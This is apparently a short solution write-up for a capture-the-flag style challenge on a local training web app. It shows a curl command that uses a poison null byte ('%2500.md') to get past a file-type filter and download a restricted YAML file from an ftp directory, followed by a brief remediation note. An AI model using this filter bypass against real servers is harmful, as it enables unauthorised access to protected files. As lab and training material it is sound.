# Misplaced Signature File  -   &#9733; &#9733; &#9733; &#9733;

In the `ftp` directory, by means of poison null byte technique, it can be retrieved the file `suspicious_errors.yml`

`$ curl http://localhost:3000/ftp/suspicious_errors.yml%2500.md -O`

## Remediation

This was simply not its place. Such files must loaded into well dedicated directory, which are protected, and which may be enforced by some control user access rules.

